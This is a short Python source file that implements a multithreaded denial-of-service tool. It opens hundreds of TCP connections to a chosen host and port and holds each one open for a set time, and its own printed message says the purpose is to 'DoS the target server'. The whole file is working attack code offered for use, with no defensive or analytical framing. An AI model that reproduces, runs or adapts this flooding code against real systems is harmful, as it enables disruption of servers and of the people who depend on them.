__author__ = 'Liew Jun Tung'

#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import socket
import time
from threading import Thread

threads = 500
t = 20
host = "0.0.0.0"
port = 0
consolestatus = ""
flag = True
flag1 = False

def setTarget(thread=500, host1="0.0.0.0", time1=20, port1=80):
    global threads, host, port, t
    threads = thread
    host = host1
    port = int(port1)
    t = int(time1)
    attack()

def connect(i):
    global consolestatus, flag1
    try:
        # flag1 = False
        consolestatus += 'Thread #%d: Launching...' % i + "\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        time.sleep(t)
        consolestatus = ""
        # print "HTTP Flag: " + flag
        # flag1 = True
        sock.close()
    except:
        consolestatus += 'Cannot connect to %s...' % host + '\n'

def getstatus():
    global consolestatus, flag1
    return (consolestatus, flag1)
#
# def getflag():
#     global flag
#     return flag
#
# def setflag(f):
#     global flag
#     flag = f

def attack():
    print('\n"Opening %s HTTP connections to DoS the target server"...\n' % threads)
    for i in range(1, threads+1):
        t = Thread(target=connect, args=(i,))
        t.start()



